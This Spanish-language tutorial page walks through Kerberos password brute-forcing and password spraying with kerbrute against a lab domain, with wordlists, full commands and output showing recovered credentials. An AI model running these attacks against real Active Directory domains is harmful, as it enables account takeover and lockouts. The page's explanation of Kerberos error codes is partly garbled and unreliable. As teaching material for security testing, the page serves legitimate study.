---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Fuerza bruta con Kerberos

En esta tecnica lo que vamos a ver es a como identificar la contraseña de un usuario que hayamos encontrado, para realizarle fuerza bruta y saber su contraseña.

Hay que decir que esta tecnica es muy intrusiva y que puede ser detectada por herramientas de seguridad, tambien hay que tener cuidado ya que si algun usuario de los que estamos probando fuerza bruta tiene un limite configurado a nivel de dominio de intentos de contraseñas podemos bloquear a dicho usuario, por lo que hay que tener cuidado.

Para realizar esto haremos lo siguiente:

> passwords.txt

```
Passw0rd
Passw0rd1
Passw0rd2
Passw0rd3
Passw0rd4
Passw0rd5
```

Una vez que hayamos creado un diccionario de contraseñas o lo hayamos extraido de algun sitio en concreto, haremos lo siguiente:

```shell
kerbrute bruteuser -d corp.local --dc 192.168.5.5 passwords.txt empleado1
```

Info:

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/14/25 - Ronnie Flathers @ropnop

2025/01/14 04:50:52 >  Using KDC(s):
2025/01/14 04:50:52 >   192.168.5.5:88

2025/01/14 04:50:52 >  [+] VALID LOGIN:  empleado1@corp.local:Passw0rd2
2025/01/14 04:50:52 >  Done! Tested 6 logins (1 successes) in 0.183 seconds
```

Vemos que nos coincidio con una contraseña de la lista que seria `Passw0rd2`.

A nivel de red haria lo siguiente, la herramienta envia paquetes con el nombre de usuario, el timestamp y la contraseña de forma cifrada, para ver que respuestas le da `kerberos` si le da un `225` es que esta fallando por que no es la contraseña correcta, pero si por ejemplo en vez de recibir un error, recibe un `AS-REP` que seria un `Replay` de que le contesta significa que la autenticacion fue exitosa, por lo que sabremos que sera esa la contraseña.

Tambien se puede probar con el siguiente formato de contarseñas:

> user\_pass.txt

```
empleado1:passw0rd
empleado2:Passw0rd3
empleado4:Passw0rd4
```

La lista tiene que ser separada con `:` de forma que sea algo asi `username:password` y ejecutar lo siguiente:

```shell
kerbrute bruteforce -d corp.local --dc 192.168.5.5 user_pass.txt
```

Info:

```__
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/14/25 - Ronnie Flathers @ropnop

2025/01/14 05:00:44 >  Using KDC(s):
2025/01/14 05:00:44 >   192.168.5.5:88

2025/01/14 05:00:44 >  [+] VALID LOGIN:  empleado2@corp.local:Passw0rd3
2025/01/14 05:00:44 >  Done! Tested 3 logins (1 successes) in 0.009 seconds
```

Y vemos que coincidio con unas credenciales.

Ahora si queremos probar hacer un `PasswordSpry` osea probar varios nombres de usuario de dominio, frente a una unica contraseña, podremos hacerlo de la siguiente forma:

Utilizaremos el `users.txt` que creamos anteriormente y pondremos lo siguiente:

```shell
kerbrute passwordspray -d corp.local --dc 192.168.5.5 users.txt Passw0rd2
```

Info:

```
    __             __               __
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/14/25 - Ronnie Flathers @ropnop

2025/01/14 05:03:57 >  Using KDC(s):
2025/01/14 05:03:57 >   192.168.5.5:88

2025/01/14 05:03:57 >  [+] VALID LOGIN:  empleado1@corp.local:Passw0rd2
2025/01/14 05:03:57 >  Done! Tested 7 logins (1 successes) in 0.014 seconds
```

Y vemos que nos saca unas credenciales.
